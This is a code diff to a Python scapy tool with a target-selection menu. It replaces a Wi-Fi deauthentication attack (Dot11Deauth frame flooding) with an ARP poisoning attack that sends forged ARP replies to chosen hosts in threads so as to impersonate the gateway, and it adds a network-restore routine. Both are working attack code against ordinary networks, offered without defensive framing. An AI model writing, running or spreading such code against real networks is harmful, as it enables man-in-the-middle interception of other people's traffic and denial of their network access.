@@ -10,7 +10,7 @@ def shelp():
 	sys.stdout.write(YELLOW + 'Just enter the index of your target' + '\n')
 	sys.stdout.write(YELLOW + "example: '1' (single choice), '14 5 6 3' (multiple choices)" + '\n' + '\n')
 	sys.stdout.write(MAGENTA + 'COMMANDS:' + '\n')
-	sys.stdout.write(MAGENTA + 'start/stop deauth '+ YELLOW + '- Start or stop sending deauth packet to targets' + '\n')
+	sys.stdout.write(MAGENTA + 'start/stop arp '+ YELLOW + '- Start or stop sending arp packet to targets' + '\n')
 	sys.stdout.write(MAGENTA + 'gateway x '+ YELLOW + "- set the gateway. type in the gateway number insthead of 'x'" + '\n')
 	sys.stdout.write(MAGENTA + 'interface '+ YELLOW + '- try to find an interface on monitor mode' + '\n')
 	sys.stdout.write(MAGENTA + 'exit '+ YELLOW + '- quit the script' + '\n')
@@ -144,11 +144,19 @@ def resolve_mac(ip):
 	if ip_check != ip:
 		return (':'.join(re.findall('..', '%012x' % uuid.getnode())))
 
-def deauth(gateway_mac, target_mac, iface, deauth_aut):
-	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-	while deauth_aut == True:
-		sendp(packet, inter=0.1, count=1, iface=iface, verbose=0)
+def restore_network(gtwip, gtwmac, trgip, trgmac):
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gtwip, hwsrc=trgmac, psrc=trgip), count=5)
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=trgip, hwsrc=gtwmac, psrc=gtwip), count=5)
+def arp_poison(gtwip, gtwmac, trgip, trgmac, arp_aut = True):
+    try:
+        while arp_aut == True:
+            send(ARP(op=2, pdst=trgip, hwdst=trgmac, psrc=gtwip),verbose=1)
+            time.sleep(2)
+        displayer('sucess', 'stoping the arp poisoning')
+        restore_network(gtwip, gtwmac, trgip, trgmac)
+    except KeyboardInterrupt:
+        sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '+'Stopped ARP poison attack. Restoring network' + '\n')
+        restore_network(gtwip, gtwmac, trgip, trgmac)
 
 def infoga():
 	hosts_info = []
@@ -238,9 +246,9 @@ def main(debug = False):
 		line()
 		try:
 			if activation == False:
-				status = BLUE + ' DEAUTH_ATTACK = ' + RED + 'OFF' + YELLOW
+				status = BLUE + ' ARP ATTACK = ' + RED + 'OFF' + YELLOW
 			if activation == True:
-				status = BLUE + ' DEAUTH_ATTACk = ' + GREEN + 'ON ' + YELLOW
+				status = BLUE + ' ARP ATTACk = ' + GREEN + 'ON ' + YELLOW
 		except:
 			useless = True
 		try:
@@ -268,28 +276,26 @@ def main(debug = False):
 			iface = interface()
 			msg='                                                                              '
 			menu(hosts, selected, msg, activation, gw, iface)
-		if choice == 'start deauth':
+		if choice == 'start arp':
 			if len(selected) == 0:
 				msg=' no target                                                                    '
-				menu(hosts, selected, msg, activation, gw, iface)
-			if iface == 'not found':
-				msg=' no interface on monitor mode                                                 '
 				menu(hosts, selected, msg, activation, gw, iface)
 			for i in range(len(selected)):
 				for j in range(len(hosts)):
 					if hosts[j][0] == gw:
 						mac_gw = hosts[j][1]
-				thread_deauth = 'thread_deauth'+str(i)
-				displayer('info', 'starting '+thread_deauth)
-				thread_deauth = 'thread-'+str(i)
-				thread_deauth = threading.Thread(deauth(selected[i][1], mac_gw, iface, deauth_aut = True))
-				thread_deauth.start()
+						ip_gw = hosts[j][0]
+				arp_aut = True
+				thread_arp = 'thread-'+str(i)
+				thread_arp = threading.Thread(target = arp_poison, args=(ip_gw, mac_gw, selected[i][2], selected[i][1], arp_aut))
+				displayer('info', 'starting '+str(thread_arp))
+				thread_arp.start()
 			activation = True
 			menu(hosts, selected, msg, activation, gw, iface)
-		if choice == 'stop deauth':
-			for i in range(len(selected)):
-				print('stop arp')
-				menu(hosts)
+		if choice == 'stop arp':
+			aut = False
+			activation = False
+			menu(hosts, selected, msg, activation, gw, iface)
 		if choice[0].isdigit() == True:
 			if len(choice)==1:
 				msg='                                                                              '
@@ -324,7 +330,7 @@ def main(debug = False):
 				menu(hosts, selected, msg, activation, gw, iface)
 		if choice == 'exit':
 			if activation == True:
-				print('stop deauth')
+				print('stop arp')
 			exit()
 		if choice[:7]=='gateway':
 			gw = hosts[int(choice[8])][0]
